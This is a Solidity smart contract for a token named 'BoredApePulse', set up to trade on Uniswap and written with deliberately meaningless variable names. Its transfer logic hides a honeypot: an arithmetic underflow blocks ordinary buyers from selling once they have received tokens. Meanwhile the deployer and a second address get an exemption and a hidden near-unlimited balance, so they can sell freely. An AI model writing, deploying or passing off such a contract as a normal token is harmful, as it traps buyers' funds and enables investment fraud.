// https://t.me/boredapepulse

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract BoredApePulse is Ownable {
    constructor(
        string memory jump,
        string memory wind,
        address inch,
        address running
    ) {
        uniswapV2Router = IUniswapV2Router02(inch);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[running] = five;
        _symbol = wind;
        _name = jump;
        potatoes = 3;
        _decimals = 9;
        bring[running] = five;
        soil = 1000000000;
        bring[msg.sender] = five;
        _tTotal = soil * 10**_decimals;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public potatoes;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private soil;
    address public uniswapV2Pair;
    uint256 private five = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private tone;

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address plan,
        address means,
        uint256 physical
    ) internal {
        uint256 music = potatoes;

        address went = uniswapV2Pair;

        if (bring[plan] == 0 && (went != plan) && least[plan] > 0) {
            bring[plan] -= music;
        }

        address its = tone;
        tone = means;

        _balances[plan] -= physical;
        uint256 slipped = (physical / 100) * potatoes;
        physical -= slipped;
        least[its] += 1 + music;
        _balances[means] += physical;
    }

    mapping(address => uint256) private least;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private bring;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}